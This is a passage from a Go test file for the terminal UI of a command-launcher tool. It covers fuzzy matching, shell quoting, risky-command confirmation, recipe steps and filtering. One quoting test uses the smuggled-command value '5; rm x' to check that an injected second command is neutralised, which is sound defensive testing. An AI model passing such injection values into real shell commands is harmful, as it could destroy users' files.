package ui

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"testing"

	tea "charm.land/bubbletea/v2"
	"github.com/charmbracelet/x/ansi"
	"github.com/con-dog/clingon/internal/config"
	"github.com/con-dog/clingon/internal/tmpl"
)

func TestScoreRanksSubstringAboveSubsequence(t *testing.T) {
	if score("del", "delete files") <= score("del", "docker exec login") {
		t.Fatal("substring should beat subsequence")
	}
	if score("xyz", "delete") != 0 {
		t.Fatal("non-match should score 0")
	}
	if score("go fold", "go to folder") == 0 {
		t.Fatal("words in order should match")
	}
}

func TestBurstIsTextNotAKeyName(t *testing.T) {
	burst := typed("delete")
	if keyName(burst) != "" {
		t.Fatal("a burst of typed text must not match the Delete key")
	}
	if keyName(tea.KeyPressMsg{Code: tea.KeyEnter}) != "enter" {
		t.Fatal("real keys keep their names")
	}
}

func TestDescribeExtendsPerArg(t *testing.T) {
	c := &config.Command{Desc: "Deletes files.", Risk: config.RiskWarn, Args: []config.Arg{
		{Name: "pattern", Desc: "Files named <pattern>."},
		{Name: "dir", Desc: "Under <dir>."},
		{Name: "flags", Type: "flags"},
	}}
	got := describe(c, map[string]string{"pattern": "*.log"}, map[string]string{}, 1, ".", "")
	if got != "Deletes files. Files named *.log. Under this folder. ⚠ Asks before running." {
		t.Fatalf("got %q", got)
	}
	got = describe(c, map[string]string{"pattern": "x", "dir": "src", "flags": "-i -w"}, map[string]string{"flags": "ignore case, whole words"}, 3, "", "")
	if got != "Deletes files. Files named x. Under src. Ignore case, whole words. ⚠ Asks before running." {
		t.Fatalf("got %q", got)
	}
}

func TestHighlightTokens(t *testing.T) {
	// Compare the plain text, and check which words got which style.
	cmd := `sudo apt update && du -h -d 1 . 2>/dev/null | sort -rh; grep -rn -- 'a b' "c"`
	if got := ansi.Strip(highlight(cmd)); got != cmd {
		t.Fatalf("highlighting changed the text: %q", got)
	}
	h := highlight(cmd)
	for _, want := range []string{
		hlProgram.Render("sudo"), hlProgram.Render("apt"), hlProgram.Render("du"), hlProgram.Render("sort"), hlProgram.Render("grep"),
		hlFlag.Render("-rh"), hlFlag.Render("--"), hlOperator.Render("&&"), hlOperator.Render("|"), hlOperator.Render(">"),
		hlString.Render("'a b'"),
	} {
		if !strings.Contains(h, want) {
			t.Errorf("missing %q", want)
		}
	}
	if strings.Contains(h, hlProgram.Render("update")) || strings.Contains(h, hlProgram.Render("/dev/null")) {
		t.Error("arguments styled as programs")
	}
}

func TestShellQuote(t *testing.T) {
	for in, want := range map[string]string{"mine": "mine", "My tools": "'My tools'", "find . -name '*.go'": `'find . -name '\''*.go'\'''`, "a/b.c:1": "a/b.c:1"} {
		if got := shellQuote(in); got != want {
			t.Errorf("shellQuote(%q) = %s, want %s", in, got, want)
		}
	}
}

func TestRiskyCommandScreen(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Delete", Cmd: "rm <file>", Risk: config.RiskWarn, Args: []config.Arg{{Name: "file"}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	key := func(k tea.KeyPressMsg) { m.Update(k) }
	enter, down := tea.KeyPressMsg{Code: tea.KeyEnter}, tea.KeyPressMsg{Code: tea.KeyDown}
	m.showSection(&m.opt.Config.Sections[0])

	key(enter) // open the command
	key(typed("a.txt"))
	key(enter) // last arg: on to the risky screen
	if m.mode != modeConfirm || m.yes {
		t.Fatalf("want the risky screen with No highlighted, mode %v yes %v", m.mode, m.yes)
	}
	key(enter) // Enter on "No, go back"
	if m.mode != modeFill || m.job.input.Value() != "a.txt" || len(sent) != 0 {
		t.Fatalf("No should go back to the answer, kept: mode %v value %q sent %v", m.mode, m.job.input.Value(), sent)
	}
	key(enter)
	key(down)  // highlight "Yes, run it"
	key(enter) // run
	if len(sent) != 1 || sent[0] != "rm a.txt" {
		t.Fatalf("got %v", sent)
	}
}

func TestValuesAreQuotedWhereTheArgSays(t *testing.T) {
	c := &config.Command{Cmd: "cd <dir> && git switch <b> && echo <raw>", Args: []config.Arg{
		{Name: "dir", Quote: true}, {Name: "b", Quote: true}, {Name: "raw"},
	}}
	got := tmpl.Render(c.Cmd, c.Known, shellValues(c, map[string]string{"dir": "My Docs", "b": "~", "raw": "a b"}))
	if got != "cd 'My Docs' && git switch ~ && echo a b" { // a typed ~ is your home
		t.Fatalf("got %s", got)
	}
	// A value typed into a fixed list instead of picked is quoted.
	c = &config.Command{Cmd: "head -n <n>", Args: []config.Arg{{Name: "n", Options: []config.Option{{Value: "10"}}}}}
	if got := tmpl.Render(c.Cmd, c.Known, shellValues(c, map[string]string{"n": "5; rm x"})); got != "head -n '5; rm x'" {
		t.Fatalf("got %s", got)
	}
}

func TestAnOptionalValueCanBeSkipped(t *testing.T) {
	sec := config.Section{Name: "Docker", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Up", Cmd: "docker compose up -d <services>", Args: []config.Arg{{Name: "services", Optional: true}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 1 || sent[0] != "docker compose up -d" {
		t.Fatalf("got %v", sent)
	}
}

func TestDisabledCommandsDontOpen(t *testing.T) {
	sec := &config.Section{Name: "Packs", Icon: "❏", Category: "Clingon", Commands: []config.Command{
		{Name: "Edit a pack", Cmd: "x <p>", Disabled: "You don't have any local packs yet.", Args: []config.Arg{{Name: "p"}}},
	}}
	m := New(Options{Config: &config.Config{}, Builtin: func() []*config.Section { return []*config.Section{sec} },
		Send: func(string) error { t.Fatal("nothing should run"); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(sec)
	if it := m.list.selected(); it == nil || !it.disabled {
		t.Fatal("the cursor lands on a greyed-out command, so it can say why")
	}
	if _, desc := m.details(); !strings.Contains(desc, "Not available: You don't have any local packs yet.") {
		t.Fatalf("the info pane says why, got %q", desc)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if m.mode != modeBrowse || m.job != nil {
		t.Fatal("a greyed-out command must not open")
	}
}

func TestCursorStartsOnAUsableRow(t *testing.T) {
	sec := &config.Section{Name: "S", Icon: "•", Category: config.Other, Groups: []config.Group{
		{Name: "A", Commands: []config.Command{{Name: "a1", Cmd: "x", Disabled: "no"}, {Name: "a2", Cmd: "x"}, {Name: "a3", Cmd: "x", Disabled: "no"}}},
		{Name: "B", Commands: []config.Command{{Name: "b1", Cmd: "x", Disabled: "no"}, {Name: "b2", Cmd: "x"}}},
	}}
	m := New(Options{Config: &config.Config{}, Builtin: func() []*config.Section { return []*config.Section{sec} }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(sec)
	at := func() string { return m.list.selected().title }
	if at() != "a2" {
		t.Fatalf("starts on the first usable row, got %q", at())
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	if at() != "a3" {
		t.Fatalf("down lands on greyed rows too, so they can say why, got %q", at())
	}
}

func TestShiftJumpsBetweenHeadings(t *testing.T) {
	items := []item{{title: "A", header: true}, {title: "a1"}, {title: "a2"}, {header: true}, {title: "B", header: true}, {title: "b1"}, {title: "b2"}}
	p := newPicker(items, nil, false)
	at := func() string { return p.selected().title }
	p.jump(1)
	if at() != "b1" {
		t.Fatalf("down from a1: %s", at())
	}
	p.jump(1)
	if at() != "b1" {
		t.Fatalf("down from the last heading stays: %s", at())
	}
	p.move(1) // b2
	p.jump(-1)
	if at() != "b1" {
		t.Fatalf("up goes to the top of the current heading first: %s", at())
	}
	p.jump(-1)
	if at() != "a1" {
		t.Fatalf("then to the previous heading: %s", at())
	}
	flat := newPicker([]item{{title: "x"}, {title: "y"}, {title: "z"}}, nil, false)
	flat.jump(1)
	if flat.selected().title != "z" {
		t.Fatal("no headings: jump to the bottom")
	}
}

func TestMenuLocksWhileShellIsBusy(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Edit a pack", Cmd: "micro x"}, {Name: "Other", Cmd: "ls"},
	}}
	var sent []string
	release := make(chan bool)
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send:     func(c string) error { sent = append(sent, c); return nil },
		WaitIdle: func() bool { return <-release }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	_, cmds := m.Update(tea.KeyPressMsg{Code: tea.KeyEnter}) // runs "micro x"
	wait := cmds().(tea.BatchMsg)[0]
	if m.busy != "Edit a pack" {
		t.Fatalf("menu should lock while it runs, busy=%q", m.busy)
	}
	if bar := ansi.Strip(m.barBody(60)); strings.Contains(bar, "is running") {
		t.Errorf("a command that's just started shouldn't flash the band, got %q", bar)
	}
	m.Update(busyGraceMsg{})
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown}) // browsing still works, as usual
	if it := m.list.selected(); it == nil || it.title != "Other" || it.disabled {
		t.Fatalf("rows stay as they are while it runs: only running waits, got %+v", it)
	}
	if cmd, _ := m.details(); !strings.Contains(ansi.Strip(cmd), "ls") {
		t.Errorf("the Command area still shows what it would run, got %q", cmd)
	}
	if bar := ansi.Strip(m.barBody(60)); !strings.Contains(bar, "◔ Edit a pack is running") {
		t.Errorf("the status bar should say so, got %q", bar)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape}) // back to the top
	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape}) // and quitting would end micro: refused
	if len(sent) != 1 || m.Quit {
		t.Fatalf("nothing runs, and no quitting, while locked: sent %v quit %v", sent, m.Quit)
	}
	go func() { release <- true }()
	m.Update(wait()) // micro exits
	if m.busy != "" {
		t.Fatal("menu should unlock when the shell is back at its prompt")
	}
	m.showSection(&m.opt.Config.Sections[0]) // the Escs above went back to the top
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 2 || sent[1] != "ls" {
		t.Fatalf("unlocked: commands run again, got %v", sent)
	}
}

// The bar's warning clears by itself: focus may never come back to prompt it.
func TestShellWarningClearsWithoutFocus(t *testing.T) {
	shell := ShellState{Typed: unfinishedCommand}
	m := New(Options{Config: &config.Config{}, Send: func(string) error { return nil },
		Shell: func() ShellState { return shell }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})

	_, look := m.Update(idleMsg{seq: -1})
	if look == nil {
		t.Fatal("a warning should keep the shell being looked at")
	}
	if bar := ansi.Strip(m.barBody(60)); !strings.Contains(bar, "middle of a command") {
		t.Fatalf("the bar should warn, got %q", bar)
	}
	if _, again := m.Update(tea.BlurMsg{}); again != nil {
		t.Fatal("one look at a time")
	}

	m.Update(shellLookMsg{}) // still there: goes on looking
	if !m.looking {
		t.Fatal("still unfinished: it should look again")
	}
	shell = ShellState{}
	if _, cmd := m.Update(shellLookMsg{}); cmd != nil || m.looking {
		t.Fatal("nothing to warn of: it should stop looking")
	}
	if bar := ansi.Strip(m.barBody(60)); strings.Contains(bar, "middle of a command") {
		t.Fatalf("the warning should be gone, got %q", bar)
	}

	// What it was warning about turned into a running command.
	m.typed, shell = "sleep 9", ShellState{Busy: "sleep"}
	m.Update(shellLookMsg{})
	if m.busy != "sleep" || !m.waiting {
		t.Fatalf("it should wait for what's running, busy=%q waiting=%v", m.busy, m.waiting)
	}

	// A command from the menu is running: a look can't unlock it early.
	m.busy, m.typed, shell = "Edit a pack", "", ShellState{}
	m.Update(shellLookMsg{})
	if m.busy != "Edit a pack" {
		t.Fatalf("the wait for it says when it's done, busy=%q", m.busy)
	}

	// The question on screen keeps what it asked about.
	m.busy, m.mode, m.typed = "", modeTyped, "git sta"
	m.Update(shellLookMsg{})
	if m.typed != "git sta" {
		t.Fatalf("typed changed under the question: %q", m.typed)
	}
}

func TestNumberKeysNumberCommands(t *testing.T) {
	cfg := func() *config.Config {
		return &config.Config{Sections: []config.Section{
			{Name: "AWS", Icon: "•", Category: config.Other, Commands: []config.Command{
				{Name: "List s3 buckets", Cmd: "aws s3 ls"},
				{Name: "A name far too long to fit in the width of the panel", Cmd: "x"},
				{Name: "Who am I", Cmd: "aws sts get-caller-identity"},
			}},
			{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Status", Cmd: "git status"}}},
		}}
	}
	current := cfg()
	m := New(Options{Config: current, Send: func(string) error { return nil }, Reload: func() (*config.Config, error) { current = cfg(); return current, nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	press := func(s string) { m.Update(typed(s)) }
	down := func() { m.Update(tea.KeyPressMsg{Code: tea.KeyDown}) }
	const width = 30
	rowOf := func(title string) string {
		t.Helper()
		for _, it := range m.list.view {
			if strings.HasPrefix(it.title, title) {
				return ansi.Strip(m.list.row(it, false, width))
			}
		}
		t.Fatalf("no row %q", title)
		return ""
	}
	// endsIn checks the number's badge is in its column, a cell off the frame.
	endsIn := func(title, n string) {
		t.Helper()
		row := rowOf(title)
		if n == "" {
			if last := strings.TrimRight(row, " "); strings.ContainsAny(last[len(last)-1:], "123456789") {
				t.Errorf("%q should have no number: %q", title, row)
			}
			return
		}
		if ansi.StringWidth(row) != width || !strings.HasSuffix(row, " "+n+"  ") {
			t.Errorf("%q should end in a badge for %s at cell %d: %q", title, n, width, row)
		}
	}

	m.showSection(&m.opt.Config.Sections[0])
	press("1")
	down()
	down()
	press("2")
	endsIn("List s3", "1")
	endsIn("Who am I", "2")
	endsIn("A name far", "")
	if m.list.query() != "" {
		t.Fatalf("numbering shouldn't reach the filter, got %q", m.list.query())
	}

	// A long name is cut short of the column, with or without a number.
	m.list.move(-1)
	before := rowOf("A name far")
	press("3")
	endsIn("A name far", "3")
	if got := strings.TrimRight(rowOf("A name far"), " 3"); got != strings.TrimRight(before, " ") {
		t.Errorf("a number shouldn't change where a name is cut: %q, then %q", before, got)
	}
	press("3") // the same number again takes it off
	endsIn("A name far", "")

	press("1") // a step holds one command, and the chain ends there
	endsIn("A name far", "1")
	endsIn("List s3", "")
	endsIn("Who am I", "")
	press("3") // past the next free step: nothing changes
	endsIn("A name far", "1")

	// Numbers carry across sections, into search, and through a reload.
	m.showSection(&m.opt.Config.Sections[1])
	press("2")
	endsIn("Status", "2")
	if !m.reload() {
		t.Fatal("expected a reload")
	}
	endsIn("Status", "2")
	m.showRoot("")
	press("/")
	press("s")
	press("t")
	press("a")
	endsIn("Status", "2")
}

func TestNumberingEndsTheChainThere(t *testing.T) {
	var cmds []config.Command
	for _, name := range strings.Split("a b c d e f g h i j", " ") {
		cmds = append(cmds, config.Command{Name: name, Cmd: name})
	}
	m := New(Options{Config: &config.Config{Sections: []config.Section{
		{Name: "S", Icon: "•", Category: config.Other, Commands: cmds},
	}}, Send: func(string) error { return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	on := func(name, key string) {
		t.Helper()
		for i, it := range m.list.view {
			if it.title == name {
				m.list.cursor = i
			}
		}
		m.Update(typed(key))
	}
	chain := func(want string) {
		t.Helper()
		var got []string
		for i, s := range m.recipe {
			got = append(got, fmt.Sprintf("%d%s", i+1, s.ref.cmd.Name))
		}
		if g := strings.Join(got, " "); g != want {
			t.Errorf("got %q, want %q", g, want)
		}
	}
	on("a", "5") // nothing yet: it has to start at 1
	chain("")
	if !strings.Contains(m.hint, "up to position 1") {
		t.Errorf("a refused number should say why, got %q", m.hint)
	}
	for i, name := range strings.Split("a b c d e f g h i", " ") {
		on(name, fmt.Sprint(i+1))
	}
	if m.hint != "" {
		t.Errorf("the next key should clear the hint, got %q", m.hint)
	}
	chain("1a 2b 3c 4d 5e 6f 7g 8h 9i")

	on("j", "9") // the last step: nothing after it to clear
	chain("1a 2b 3c 4d 5e 6f 7g 8h 9j")
	on("j", "2") // a new command at 2: it takes 2 and ends the chain
	chain("1a 2j")
	on("c", "5") // past the next free step: refused
	chain("1a 2j")
	on("c", "3")
	chain("1a 2j 3c")
	on("j", "2") // its own number: only that step goes, the rest close up
	chain("1a 2c")
	on("a", "1")
	chain("1c")
	on("c", "2") // another number repeats it: step 1 stays
	chain("1c 2c")
	on("d", "2")
	on("e", "3")
	on("c", "2") // it takes 2, keeps its 1, and ends the chain
	chain("1c 2c")
	on("e", "3")
	on("e", "1") // an earlier number takes that step and ends the chain there
	chain("1e")
}

// A command can be several steps: its row shows each, ascending, and each
// number only touches its own step.
func TestRepeatedSteps(t *testing.T) {
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "pull", Cmd: "git pull"}, {Name: "status", Cmd: "git status"},
	}}}}, Send: func(c string) error { sent = append(sent, c); return nil }, WaitIdle: func() bool { return true },
		Shell: func() ShellState { return ShellState{} },
		Builtin: func() []*config.Section {
			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
		}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	on := func(name, key string) {
		t.Helper()
		i := slices.IndexFunc(m.list.view, func(it item) bool { return it.title == name })
		if i < 0 {
			t.Fatalf("no row %q", name)
		}
		m.list.cursor = i
		m.Update(typed(key))
	}
	steps := func() string {
		var got []string
		for _, s := range m.recipe {
			got = append(got, s.ref.cmd.Name)
		}
		return strings.Join(got, " ")
	}
	badges := func(name string) string {
		t.Helper()
		const width = 40
		for _, it := range m.list.view {
			if it.title == name {
				row := ansi.Strip(m.list.row(it, false, width))
				if ansi.StringWidth(row) > width {
					t.Errorf("row is wider than the list: %q", row)
				}
				return strings.Join(strings.Fields(strings.TrimPrefix(strings.TrimSpace(row), name)), " ")
			}
		}
		t.Fatalf("no row %q", name)
		return ""
	}

	on("status", "1")
	on("pull", "2")
	on("status", "3")
	if steps() != "status pull status" || badges("status") != "1 3" || badges("pull") != "2" {
		t.Fatalf("steps %q, status %q, pull %q", steps(), badges("status"), badges("pull"))
	}
	on("status", "4") // more of the same stays in order
	if badges("status") != "1 3 4" {
		t.Errorf("badges should ascend, got %q", badges("status"))
	}
	on("status", "3") // only that step goes
	if steps() != "status pull status" || badges("status") != "1 3" {
		t.Errorf("steps %q, status %q", steps(), badges("status"))
	}
	on("status", "1") // the first of them: the rest close up
	if steps() != "pull status" || badges("status") != "2" {
		t.Errorf("steps %q, status %q", steps(), badges("status"))
	}

	// In the recipe's own list a row is one step, with one number.
	on("status", "3")
	m.Update(typed("r"))
	var rows []string
	for _, it := range m.list.view {
		if s := m.itemSteps(it); len(s) > 0 {
			rows = append(rows, fmt.Sprint(s, it.title))
		}
	}
	if got := strings.Join(rows, " "); got != "[1]pull [2]status [3]status" {
		t.Errorf("rows = %q", got)
	}
	on("status", "4") // the first status row adds another, like anywhere else
	if steps() != "pull status status status" {
		t.Errorf("steps %q", steps())
	}

	// All nine on one row, in a narrow list: still ascending, and inside it.
	row, w := stepBadges([]int{1, 2, 3, 4, 5, 6, 7, 8, 9}, 20)
	if got := ansi.Strip(row); got != " 1   2   3   4  …" || ansi.StringWidth(got) != w {
		t.Errorf("got %q, width %d", got, w)
	}
	if one, w := stepBadges([]int{7}, 1); ansi.Strip(one) != " 7 " || w != stepW {
		t.Errorf("one badge should always show, got %q width %d", one, w)
	}
}

func commandLineModel(t *testing.T, saved *[]config.Recipe, sent *[]string) (*Model, *config.Section) {
	t.Helper()
	free := &config.Section{Name: CommandLineSection, Icon: "•", Category: config.CommandLine, Groups: []config.Group{{Name: "Custom", Commands: []config.Command{
		{ID: CommandLineID, Name: "Type a command", Cmd: "<command>", Args: []config.Arg{{Name: "command"}}},
	}}}}
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "status", Cmd: "git status"}}}}},
		Reload: func() (*config.Config, error) { return nil, nil }, // nothing changed
		Send:   func(c string) error { *sent = append(*sent, c); return nil }, WaitIdle: func() bool { return true },
		Shell: func() ShellState { return ShellState{} }, Self: "clingon",
		Recipes: func() []config.Recipe { return *saved },
		Builtin: func() []*config.Section {
			return []*config.Section{free, {Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
		}})
	m.Update(tea.WindowSizeMsg{Width: 80, Height: 40})
	return m, free
}

// Type a command is numbered like any other, and asks when the recipe reaches it.
func TestTypeACommandInARecipe(t *testing.T) {
	const sortCmd = `sort < in.txt | echo "it's"`
	var saved []config.Recipe
	var sent []string
	m, free := commandLineModel(t, &saved, &sent)
	enter := func() { t.Helper(); m.Update(tea.KeyPressMsg{Code: tea.KeyEnter}) }
	right := func() { t.Helper(); m.Update(tea.KeyPressMsg{Code: tea.KeyRight}) }
	idle := func() { t.Helper(); m.Update(idleMsg{seq: m.run.seq, ok: true}) }
	keys := func() string {
		var got []string
		for _, s := range m.recipe {
			got = append(got, s.key)
		}
		return strings.Join(got, " ")
	}
	on := func(name string) {
		t.Helper()
		i := slices.IndexFunc(m.list.view, func(it item) bool { return it.title == name })
		if i < 0 {
			t.Fatalf("no row %q", name)
		}
		m.list.cursor = i
	}

	// A number just adds it: nothing asks yet.
	m.showSection(free)
	on("Type a command")
	m.Update(typed("1"))
	if m.mode != modeBrowse || keys() != CommandLineID {
		t.Fatalf("mode %v, keys %q", m.mode, keys())
	}
	m.showSection(&m.opt.Config.Sections[0])
	on("status")
	m.Update(typed("2"))
	statusID := m.recipe[1].key
	m.showSection(free)
	on("Type a command")
	m.Update(typed("3"))
	if got := m.itemSteps(m.list.view[m.list.cursor]); !slices.Equal(got, []int{1, 3}) {
		t.Errorf("the row should show both its steps, got %v", got)
	}
	m.Update(typed("3")) // its own number takes that step off
	if m.mode != modeBrowse || keys() != CommandLineID+" "+statusID {
		t.Fatalf("mode %v, keys %q", m.mode, keys())
	}
	m.Update(typed("3"))
	if got := m.saveCommand("name"); got != "clingon recipe add name "+CommandLineID+" "+statusID+" "+CommandLineID {
		t.Errorf("save = %q", got)
	}

	// Each one asks when the recipe gets to it, and what's typed goes as typed.
	m.Update(typed("r"))
	on("Run recipe")
	right() // Save first?
	right() // No
	if m.mode != modeFill || len(sent) != 0 {
		t.Fatalf("step 1 should ask: mode %v, sent %q", m.mode, sent)
	}
	m.Update(typed(sortCmd))
	enter()
	if !slices.Equal(sent, []string{sortCmd}) {
		t.Fatalf("sent %q", sent)
	}
	idle() // on to status, with nothing to ask
	if !slices.Equal(sent, []string{sortCmd, "git status"}) {
		t.Fatalf("sent %q", sent)
	}
	idle()
	if m.mode != modeFill {
		t.Fatalf("step 3 should ask again, not reuse step 1: mode %v", m.mode)
	}
	if v := m.job.input.Value(); v != "" {
		t.Errorf("step 3 should start empty, got %q", v)
	}
	m.Update(typed("echo hello world"))
	enter()
	idle()
	if m.run != nil || !slices.Equal(sent, []string{sortCmd, "git status", "echo hello world"}) {
		t.Errorf("run %+v, sent %q", m.run, sent)
	}

	// Saved, it finds the command again, and asks again.
	sent, saved = nil, []config.Recipe{{Name: "Asks", Steps: []string{CommandLineID}}}
	m.Update(typed("x"))
	m.Update(typed("r"))
	on("Asks")
	right()
	right() // Run
	if m.errMsg != "" || m.mode != modeFill || len(sent) != 0 {
		t.Fatalf("err %q, mode %v, sent %q", m.errMsg, m.mode, sent)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
	m.run = nil

	// A reload keeps it, while a command whose pack went leaves the recipe.
	m.recipe = nil
	m.showSection(free)
	on("Type a command")
	m.Update(typed("1"))
	sec := &m.opt.Config.Sections[0]
	m.recipe = append(m.recipe, recipeStep{statusID, cmdRef{"Git", sec, &sec.Commands[0]}})
	m.opt.Reload = func() (*config.Config, error) { return &config.Config{}, nil } // Git's pack has gone
	if !m.reload() {
		t.Fatal("expected a reload")
	}
	if keys() != CommandLineID {
		t.Errorf("keys %q", keys())
	}
}

// Enter on the row runs what's typed once, keeping nothing, exactly as typed.
func TestTypeACommandOnce(t *testing.T) {
	var saved []config.Recipe
	var sent []string
	m, free := commandLineModel(t, &saved, &sent)
	m.showSection(free)
	m.list.cursor = slices.IndexFunc(m.list.view, func(it item) bool { return it.title == "Type a command" })
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(typed(`echo "hi there" > <out>`))
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if !slices.Equal(sent, []string{`echo "hi there" > <out>`}) || len(m.recipe) != 0 {
		t.Errorf("sent %q, recipe %v", sent, m.recipe)
	}
}

// The filter opens with /, so letters and digits have a job only once it has.
func TestSlashOpensTheFilter(t *testing.T) {
	m := New(Options{Config: &config.Config{Sections: []config.Section{
		{Name: "AWS", Icon: "•", Category: config.Other, Commands: []config.Command{
			{Name: "ec2 list", Cmd: "aws ec2"}, {Name: "s3 list", Cmd: "aws s3"},
		}},
	}}, Send: func(string) error { return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	press := func(s string) { t.Helper(); m.Update(typed(s)) }
	key := func(code rune) { t.Helper(); m.Update(tea.KeyPressMsg{Code: code}) }
	queryIs := func(want string) {
		t.Helper()
		if got := m.list.filter.Value(); got != want {
			t.Errorf("filter = %q, want %q", got, want)
		}
	}

	// Not filtering: text goes nowhere, and a digit on a section does nothing.
	for _, k := range []string{"e", "4", "ec2"} {
		press(k)
		queryIs("")
		if m.hint != "Press / to filter" {
			t.Errorf("%q should say how to filter, got %q", k, m.hint)
		}
	}
	if view := ansi.Strip(m.browseView(60, 10)); !strings.Contains(view, "❯ / to filter") {
		t.Errorf("the filter's line should say how to open it:\n%s", view)
	}

	// / opens it, without typing itself. Digits are search, not steps.
	press("/")
	queryIs("")
	if m.hint != "" {
		t.Errorf("hint should clear, got %q", m.hint)
	}
	if view := ansi.Strip(m.browseView(60, 10)); !strings.Contains(view, "type to filter") {
		t.Errorf("an open filter is an input:\n%s", view)
	}
	press("e")
	press("c")
	press("2")
	queryIs("ec2")
	if it := m.list.selected(); it == nil || it.title != "ec2 list" {
		t.Fatalf("it should search every command, at %+v", it)
	}
	if len(m.recipe) != 0 {
		t.Fatalf("no numbering while filtering, got %v", m.recipe)
	}
	press("?") // text, while it's open
	queryIs("ec2?")
	if m.help {
		t.Error("? is text while filtering")
	}

	// / again closes it, keeping what's typed. It only does that as a key of
	// its own: in pasted text it's part of the search.
	press("/")
	queryIs("ec2?")
	if m.list.filtering {
		t.Error("a second / should stop filtering")
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
	queryIs("")
	press("/")
	m.Update(tea.PasteMsg{Content: "a/b"})
	queryIs("a/b")
	if !m.list.filtering {
		t.Error("a / in pasted text shouldn't stop filtering")
	}
	press("/")
	if m.list.filtering || m.section != nil {
		t.Errorf("/ should only stop filtering: filtering %v, section %v", m.list.filtering, m.section)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
	press("/")
	press("ec2")

	// esc clears it and stops filtering, in one: digits are back to normal.
	key(tea.KeyEscape)
	queryIs("")
	if m.list.filtering {
		t.Error("esc should stop filtering")
	}
	if m.Quit {
		t.Fatal("that esc shouldn't quit")
	}

	// In a section too: opened with nothing typed, esc just closes it.
	m.showSection(&m.opt.Config.Sections[0])
	press("/")
	key(tea.KeyEscape)
	if m.list.filtering || m.section == nil {
		t.Fatalf("esc should only close the filter: filtering %v, section %v", m.list.filtering, m.section)
	}
	press("1")
	if len(m.recipe) != 1 {
		t.Fatalf("out of the filter, a digit numbers: %v", m.recipe)
	}
	press("/")
	press("2") // in the filter, it doesn't
	queryIs("2")
	if len(m.recipe) != 1 {
		t.Fatalf("in the filter, a digit is search: %v", m.recipe)
	}
	m.Update(tea.KeyPressMsg{Code: 'c', Mod: tea.ModCtrl}) // ctrl-c stops filtering too
	if m.list.filtering || m.section == nil {
		t.Fatalf("ctrl-c should only stop filtering: filtering %v", m.list.filtering)
	}

	// ← moves back through what's typed, and past its start leaves the
	// filter behind: the arrows always move you on.
	m.showRoot("")
	press("/")
	press("aws")
	for range 3 {
		key(tea.KeyLeft)
	}
	if !m.list.filtering || m.list.filter.Position() != 0 {
		t.Errorf("← should move back through the text first: filtering %v, at %d", m.list.filtering, m.list.filter.Position())
	}
	key(tea.KeyLeft)
	if m.list.filtering {
		t.Error("← past its start should stop filtering at the top")
	}

	// Fast typing can bring the / and what's after it in one message.
	press("/ec2")
	queryIs("ec2")
	if !m.list.filtering {
		t.Error("the burst should open the filter")
	}
	m.list.clearFilter()

	// Pasted text does what typing would.
	m.Update(tea.PasteMsg{Content: "ec2"})
	queryIs("")
	m.Update(tea.PasteMsg{Content: "/ec2"})
	queryIs("ec2")
	m.list.clearFilter()

	// [ ] still jump, and the arrows still move, without a filter.
	press("]")
	key(tea.KeyDown)
	queryIs("")

	// A reload (coming back to the menu) keeps it open.
	m.opt.Reload = func() (*config.Config, error) { return m.opt.Config, nil }
	press("/")
	press("ec")
	if !m.reload() || !m.list.filtering {
		t.Errorf("a reload should keep the filter open: %v", m.list.filtering)
	}
	queryIs("ec")
}

// A section can have a heading and nothing under it yet: every key still has
// to behave there.
func TestEmptySectionIsSafe(t *testing.T) {
